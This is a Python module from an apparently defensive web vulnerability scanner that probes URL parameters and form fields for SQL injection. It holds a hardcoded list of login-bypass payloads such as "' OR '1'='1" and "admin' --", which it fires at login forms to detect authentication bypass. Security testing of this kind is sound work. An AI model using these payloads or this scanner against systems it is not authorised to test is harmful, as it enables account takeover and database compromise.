from SentinelLite.models.finding import Finding
from SentinelLite.engine.severity_classifier import SeverityClassifier


class SQLiModule:
    def __init__(self, payloads):
        self.payloads = payloads
        self.classifier = SeverityClassifier()

    def run(self, url, request_manager, mutation_engine, analyzer, forms=None):
        """Test URL parameters and forms for SQL injection"""
        findings = []
        
        # Test URL parameters (original functionality)
        findings.extend(self._test_url_parameters(url, request_manager, mutation_engine, analyzer))
        
        # Test forms (NEW)
        if forms:
            findings.extend(self._test_forms(forms, request_manager, analyzer))
        
        return findings

    def _test_url_parameters(self, url, request_manager, mutation_engine, analyzer):
        """Test URL GET parameters for SQL injection"""
        findings = []
        baseline = request_manager.get(url)
        if not baseline:
            return findings

        for mutation in mutation_engine.generate_mutations(url, self.payloads):
            response = request_manager.get(mutation["url"])
            if not response:
                continue

            analysis = analyzer.analyze(baseline, response, mutation["payload"])
            severity, confidence = self.classifier.sqli(analysis, analyzer.length_delta_threshold)
            if severity:
                findings.append(
                    Finding(
                        type="SQL Injection",
                        owasp_category="A03:2021 - Injection",
                        severity=severity,
                        confidence=confidence,
                        endpoint=url,
                        payload=mutation["payload"],
                        details=f"SQL injection vulnerability detected in URL parameter. {analysis.get('reason', 'SQL error patterns or significant response variations detected.')}",  # noqa: E501
                        source="SQLiModule",
                    ).to_dict()
                )

        return findings

    def _test_forms(self, forms, request_manager, analyzer):
        """Test form inputs for SQL injection (POST/GET forms)"""
        findings = []
        
        for form in forms:
            action_url = form.get("action")
            method = form.get("method", "GET").upper()
            inputs = form.get("inputs", [])
            
            if not inputs:
                continue
            
            print(f"  [*] Testing form: {action_url} ({method}) with {len(inputs)} inputs")
            
            # Get baseline response with normal/invalid credentials
            if method == "POST":
                baseline_data = {inp: "invalid_test_data" for inp in inputs}
                baseline = request_manager.post(action_url, data=baseline_data)
            else:
                baseline_data = {inp: "invalid_test_data" for inp in inputs}
                baseline = request_manager.get(action_url, params=baseline_data)
            
            if not baseline:
                continue
            
            # Test each input field with SQL injection payloads
            for input_name in inputs:
                form_findings = self._test_form_input(
                    action_url, method, inputs, input_name, 
                    baseline, request_manager, analyzer
                )
                findings.extend(form_findings)
                
                # If we found a vulnerability, report it immediately
                if form_findings:
                    for finding in form_findings:
                        print(f"    ✓ FOUND: {finding.get('type')} in '{input_name}' - {finding.get('severity')} severity")
        
        return findings

    def _test_form_input(self, action_url, method, all_inputs, target_input, baseline, request_manager, analyzer):
        """Test a specific form input with SQL injection payloads"""
        findings = []
        
        # Specific payloads for login bypass (more effective)
        login_bypass_payloads = [
            "admin' --",
            "admin' #",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR 1=1--",
            "admin'/*",
            "' or 1=1#",
            "') or ('1'='1--",
        ]
        
        # Determine if this is a login form
        is_login_form = any(keyword in target_input.lower() for keyword in ['user', 'pass', 'login', 'email', 'uid'])
        
        # Use login-specific payloads for login forms, otherwise use all payloads
        test_payloads = login_bypass_payloads if is_login_form else self.payloads
        
        for payload in test_payloads:
            # Create form data with payload in target input
            form_data = {}
            for inp in all_inputs:
                if inp == target_input:
                    form_data[inp] = payload
                else:
                    # For password fields in login forms, use any value
                    if 'pass' in inp.lower():
                        form_data[inp] = "anything"
                    else:
                        form_data[inp] = "test"
            
            # Send request
            if method == "POST":
                response = request_manager.post(action_url, data=form_data)
            else:
                response = request_manager.get(action_url, params=form_data)
            
            if not response:
                continue
            
            # Analyze response
            analysis = analyzer.analyze(baseline, response, payload)
            severity, confidence = self.classifier.sqli(analysis, analyzer.length_delta_threshold)
            
            if severity:
                form_type = "Login Form" if is_login_form else "Form Input"
                
                # Build detailed description
                details = f"SQL injection vulnerability detected in {form_type} field '{target_input}'. "
                details += f"Method: {method}. "
                
                if analysis.get('auth_bypass'):
                    details += "⚠️ CRITICAL: Authentication bypass successful! "
                    details += f"Payload '{payload}' bypassed authentication. "
                
                details += analysis.get('reason', '')
                
                findings.append(
                    Finding(
                        type="SQL Injection",
                        owasp_category="A03:2021 - Injection",
                        severity=severity,
                        confidence=confidence,
                        endpoint=action_url,
                        payload=f"{target_input}={payload}",
                        details=details,
                        source="SQLiModule",
                    ).to_dict()
                )
                
                # Found vulnerability, don't test more payloads on this input
                break
        
        return findings
